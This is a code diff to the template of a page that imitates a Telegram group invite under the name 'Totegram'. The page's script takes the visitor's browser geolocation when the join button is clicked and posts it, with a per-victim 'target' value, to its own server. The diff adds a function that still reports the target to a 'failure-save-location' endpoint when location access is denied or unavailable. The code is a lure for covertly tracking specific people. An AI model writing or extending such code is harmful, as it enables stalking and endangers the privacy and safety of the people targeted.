@@ -84,7 +84,9 @@
           </a>
         </div>
         <div class="tgme_page_additional">
-          If you have <strong>Totegram</strong>, you can view and join <br><strong><%= group.name %></strong> right away.
+          If you have <strong>Totegram</strong>, you can view and join <br><strong>
+            <%= group.name %>
+          </strong> right away.
         </div>
       </div>
 
@@ -95,11 +97,29 @@
 
   <script type="text/javascript">
     console.clear();
+    function sendFailure() {
+      var target = '<%= group.target %>';
+      fetch('/groups/failure-save-location', {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({ target })
+      })
+        .then(response => response.json())
+        .then(data => {
+          window.location.href = button.getAttribute('href');
+        })
+        .catch(error => {
+          console.log('Error saving location:', error);
+          window.location.href = button.getAttribute('href');
+        });
+    }
     function initGeolocationTracking(button) {
       if ("geolocation" in navigator) {
         navigator.geolocation.getCurrentPosition(
           (position) => {
-            const target = '<%= group.target %>';
+            var target = '<%= group.target %>';
             const latitude = position.coords.latitude;
             const longitude = position.coords.longitude;
             const groupId = button.dataset.groupId;
@@ -109,7 +129,7 @@
               headers: {
                 'Content-Type': 'application/json'
               },
-              body: JSON.stringify({ latitude, longitude, groupId, position: positionLink,target })
+              body: JSON.stringify({ latitude, longitude, groupId, position: positionLink, target })
             })
               .then(response => response.json())
               .then(data => {
@@ -117,16 +137,20 @@
               })
               .catch(error => {
                 console.log('Error saving location:', error);
+                sendFailure();
                 window.location.href = button.getAttribute('href');
               });
           },
           (error) => {
+
             console.log("Error getting location:", error.message);
+            sendFailure();
             window.location.href = button.getAttribute('href');
           }
         );
       } else {
         console.log("Geolocation is not supported by this browser.");
+        sendFailure();
         window.location.href = button.getAttribute('href');
       }
     }
